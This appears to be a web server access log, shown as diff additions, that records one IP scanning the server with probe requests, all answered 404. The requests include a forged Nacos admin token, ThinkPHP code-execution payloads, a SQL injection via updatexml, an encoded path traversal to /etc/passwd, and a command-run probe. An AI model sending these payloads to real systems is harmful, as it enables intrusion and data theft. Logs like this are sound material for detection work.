+INFO:     9.135.100.135:34576 - "GET /sse?transportType=stdio&command=echo&args=IT_RiskScan HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34578 - "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34584 - "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34622 - "GET /api/version HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34636 - "POST /login/userverify.cgi HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34638 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34656 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34662 - "GET /naming/v1/services?limit=10&offset=0 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34688 - "GET /web/admin/setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34690 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34714 - "GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34722 - "POST /?s=index/index/index HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34758 - "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34760 - "POST /index.php?s=captcha HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34782 - "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34784 - "GET /api/cluster/global HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34822 - "GET /setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34830 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34834 - "GET /api/v1/namespaces/default/workflows?query HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34864 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34874 - "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:35814 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:37338 - "GET /icons/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
